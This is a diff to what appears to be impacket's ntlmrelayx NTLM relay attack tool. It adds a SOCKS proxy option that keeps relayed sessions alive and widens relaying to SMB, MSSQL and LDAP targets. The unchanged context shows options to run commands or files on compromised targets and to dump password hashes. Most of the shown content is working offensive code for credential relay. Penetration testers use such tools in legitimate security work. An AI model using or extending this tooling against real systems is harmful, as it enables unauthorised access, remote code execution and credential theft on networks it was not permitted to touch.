@@ -13,15 +13,16 @@
 #
 # Description:
 #             This module performs the SMB Relay attacks originally discovered
-# by cDc. It receives a list of targets and for every connection received it 
+# by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
+# It receives a list of targets and for every connection received it
 # will choose the next target and try to relay the credentials. Also, if
 # specified, it will first to try authenticate against the client connecting 
 # to us.
 # 
 # It is implemented by invoking a SMB and HTTP Server, hooking to a few 
-# functions and then using the smbclient portion. It is supposed to be 
-# working on any LM Compatibility level. The only way to stop this attack 
-# is to enforce on the server SPN checks and or signing.
+# functions and then using the specific protocol clients (e.g. SMB, LDAP).
+# It is supposed to be working on any LM Compatibility level. The only way
+# to stop this attack is to enforce on the server SPN checks and or signing.
 # 
 # If the target system is enforcing signing and a machine account was provided,
 # the module will try to gather the SMB session key through 
@@ -52,6 +53,7 @@ from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
+from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
 from impacket.smbconnection import SMBConnection
 from smbclient import MiniImpacketShell
 
@@ -374,6 +376,8 @@ if __name__ == '__main__':
 
     #SMB arguments
     smboptions = parser.add_argument_group("SMB client options")
+    smboptions.add_argument('-socks', action='store_true', default=False,
+                        help='Launch a SOCKS proxy for the connection relayed')
     smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
                                      'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     smboptions.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
@@ -438,9 +442,17 @@ if __name__ == '__main__':
         watchthread = TargetsFileWatcher(targetSystem)
         watchthread.start()
 
+    if options.socks is True:
+        # Start a SOCKS proxy in the background
+        s = SOCKS()
+        socks_thread = Thread(target=s.serve_forever)
+        socks_thread.daemon = True
+        socks_thread.start()
+
     for server in RELAY_SERVERS:
         #Set up config
         c = NTLMRelayxConfig()
+        c.setRunSocks(options.socks)
         c.setTargets(targetSystem)
         c.setExeFile(options.e)
         c.setCommand(options.c)
